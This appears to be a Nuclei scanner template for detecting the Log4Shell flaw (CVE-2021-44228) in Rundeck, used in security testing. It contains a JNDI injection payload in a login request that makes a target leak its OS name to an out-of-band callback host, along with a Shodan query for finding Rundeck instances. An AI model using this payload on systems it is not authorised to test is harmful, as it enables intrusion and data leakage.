id: rundeck-log4j
info:
  name: Rundeck - Remote Code Execution (Apache Log4j)
  author: DhiyaneshDK
  severity: critical
  description: Rundeck is vulnerable to remote code execution through Apache Log4j,
    allowing attackers to obtain sensitive information, inject malware, modify data,
    and gain full control without needing any credentials.
  reference:
  - https://docs.rundeck.com/docs/history/CVEs/log4j.html
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-77
  metadata:
    shodan-query: title:"Rundeck"
    verified: 'true'
    impact: The impact of Rundeck's susceptibility to remote code execution via the
      Apache Log4j framework is potentially devastating, allowing an attacker to execute
      malware, steal sensitive information, alter data, and gain complete control
      of a compromised system without the need for credentials.
    recommendation: It is strongly recommended to update Rundeck to the latest version
      to mitigate the risk of remote code execution attacks through the vulnerable
      Apache Log4j framework as soon as possible.
  tags: cve,cve2021,rce,jndi,log4j,rundeck,kev,oast
requests:
- raw:
  - 'POST /j_security_check HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Origin: {{BaseURL}}

    Connection: close

    Referer: {{BaseURL}}/user/login


    j_username=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&j_password=admin

    '
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: regex
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+
  - type: word
    part: location
    words:
    - '{{BaseURL}}/user/error'
  extractors:
  - type: kval
    kval:
    - interactsh_ip
  - type: regex
    part: interactsh_request
    group: 1
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
